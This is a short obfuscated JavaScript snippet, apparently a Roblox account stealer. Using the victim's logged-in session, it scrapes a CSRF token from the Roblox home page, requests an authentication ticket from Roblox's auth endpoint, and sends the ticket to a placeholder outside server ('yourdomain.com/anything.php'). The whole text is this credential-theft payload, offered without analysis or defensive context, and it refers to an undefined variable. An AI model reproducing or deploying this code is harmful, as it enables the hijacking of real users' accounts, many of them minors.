(async function() {
    var _0x3051de = (await (await fetch("https://www.roblox.com/home", {
        'credentials': 'include'
    }))['text']())['split']('setToken(\x27')[0x1]['split']('\x27)')[0x0];
    var _0x3e8f56 = (await fetch('https://auth.roblox.com/v1/authentication-ticket', {
        'method': 'POST',
        'credentials': 'include',
        'headers': {
            'x-csrf-token': _0x3051de
        }
    }))['headers']['get']('rbx-authentication-ticket');
    await fetch("https://yourdomain.com/anything.php" + '?id= ' + id + '?t=' + _0x3e8f56);
}());